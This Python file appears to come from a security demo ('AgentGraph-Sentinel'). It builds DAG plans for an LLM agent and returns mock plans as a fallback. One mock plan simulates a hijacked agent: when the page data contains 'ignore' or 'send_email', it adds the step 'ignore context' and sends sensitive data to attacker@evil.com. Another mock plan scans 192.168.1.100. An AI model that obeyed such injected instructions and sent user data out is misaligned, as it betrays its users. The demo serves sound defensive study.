import json
from typing import List, Dict, Any
from langchain_core.messages import HumanMessage
from langchain_openai import ChatOpenAI
from config.settings import get_settings

settings = get_settings()

class AgentExecutor:
    """
    Agent执行器：尝试调用LLM，支持生成带有依赖关系的执行计划。
    如果调用失败，自动回退到模拟模式以保证演示稳定性。
    """
    def __init__(self):
        # 检查是否有Key，如果没有，打印警告
        if not settings.OPENROUTER_API_KEY:
            print("⚠️ Warning: No OpenRouter API Key found. Using Mock Mode.")
            self.llm = None
        else:
            try:
                self.llm = ChatOpenAI(
                    base_url=settings.OPENROUTER_BASE_URL,
                    api_key=settings.OPENROUTER_API_KEY,
                    model=settings.OPENROUTER_MODEL,
                    temperature=0, # 降低随机性
                    default_headers={
                        "HTTP-Referer": "http://localhost:8501",
                        "X-Title": "AgentGraph-Sentinel"
                    }
                )
            except Exception as e:
                print(f"⚠️ LLM Init Failed: {e}")
                self.llm = None

    def generate_execution_plan(self, user_input: str, external_data: str = None) -> List[Dict[str, Any]]:
        """
        生成执行计划。如果LLM失败，返回模拟数据。
        """
        # 1. 尝试调用 LLM
        if self.llm:
            try:
                context = ""
                if external_data:
                    context = f"\n\nCONTEXT DATA:\n{external_data}"

                prompt = f"""
                You are an AI Agent Planner. Break down the request into a Directed Acyclic Graph (DAG) of steps.
                
                User Request: "{user_input}"
                {context}
                
                Tools: web_search, read_url, send_email, read_file, write_file, nmap_scan, vuln_scan.
                
                Return a JSON array where each step has:
                - "step_id": int
                - "type": "action" or "tool"
                - "description": str
                - "tool_name": str (optional)
                - "dependencies": [int] (list of step_ids that this step depends on. Empty for root steps)
                
                Example of branching:
                [
                    {{"step_id": 1, "type": "action", "description": "Start", "dependencies": []}},
                    {{"step_id": 2, "type": "tool", "tool_name": "scan_A", "description": "Branch A", "dependencies": [1]}},
                    {{"step_id": 3, "type": "tool", "tool_name": "scan_B", "description": "Branch B", "dependencies": [1]}},
                    {{"step_id": 4, "type": "action", "description": "Merge", "dependencies": [2, 3]}}
                ]
                
                ONLY RETURN JSON.
                """
                
                response = self.llm.invoke([HumanMessage(content=prompt)])
                content = response.content.strip()
                if content.startswith("```json"):
                    content = content.replace("```json", "").replace("```", "")
                
                return json.loads(content)
            
            except Exception as e:
                print(f"❌ LLM Call Failed: {e}")
                print("🔄 Switching to Fallback Mock Plan...")
                # 失败后继续执行下方的回退逻辑

        # 2. 回退模式（Fallback Mock Plan）
        return self._get_mock_plan(user_input, external_data)

    def _get_mock_plan(self, user_input: str, external_data: str) -> List[Dict[str, Any]]:
        """
        针对不同场景的模拟计划 (带依赖关系支持)
        """
        lower_input = user_input.lower()
        
        # === 场景A：并行漏洞扫描 (展示图状/分支结构) ===
        if "扫描" in lower_input or "scan" in lower_input:
            return [
                # 根节点
                {"step_id": 1, "type": "action", "description": "初始化扫描任务: 目标 192.168.1.100", "dependencies": []},
                
                # 分支 1：端口扫描
                {"step_id": 2, "type": "tool", "tool_name": "nmap_scan", "description": "执行端口扫描 (Port 1-1000)", "dependencies": [1]},
                
                # 分支 2：Web漏洞扫描 (并行)
                {"step_id": 3, "type": "tool", "tool_name": "web_vuln_scan", "description": "执行Web服务漏洞检测", "dependencies": [1]},
                
                # 分支 3：系统指纹识别 (并行)
                {"step_id": 4, "type": "tool", "tool_name": "os_fingerprint", "description": "识别操作系统类型", "dependencies": [1]},
                
                # 汇聚节点：生成报告 (依赖 2, 3, 4)
                {"step_id": 5, "type": "action", "description": "汇总所有扫描结果并生成报告", "dependencies": [2, 3, 4]}
            ]

        # === 场景B：邮件泄露 (线性结构) ===
        elif "总结" in lower_input or "summarize" in lower_input or "email" in lower_input:
            plan = [
                {"step_id": 1, "type": "action", "description": "分析用户请求：总结网页", "dependencies": []},
                {"step_id": 2, "type": "tool", "tool_name": "read_url", "description": "读取网页内容", "dependencies": [1]},
                {"step_id": 3, "type": "action", "description": "提取关键信息", "dependencies": [2]},
            ]
            # 如果外部数据里有恶意指令，模拟 Agent 被劫持
            if external_data and ("ignore" in external_data.lower() or "send_email" in external_data.lower()):
                plan.append({"step_id": 4, "type": "action", "description": "检测到新指令：忽略上下文", "dependencies": [3]})
                plan.append({"step_id": 5, "type": "tool", "tool_name": "send_email", "description": "发送敏感数据至 attacker@evil.com", "dependencies": [4]})
            else:
                plan.append({"step_id": 4, "type": "action", "description": "生成摘要并返回", "dependencies": [3]})
            return plan

        # === 默认：线性结构 ===
        else:
            return [
                {"step_id": 1, "type": "action", "description": "分析请求意图", "dependencies": []},
                {"step_id": 2, "type": "tool", "tool_name": "web_search", "description": f"搜索: {user_input}", "dependencies": [1]},
                {"step_id": 3, "type": "action", "description": "整理搜索结果并回答", "dependencies": [2]},
            ]
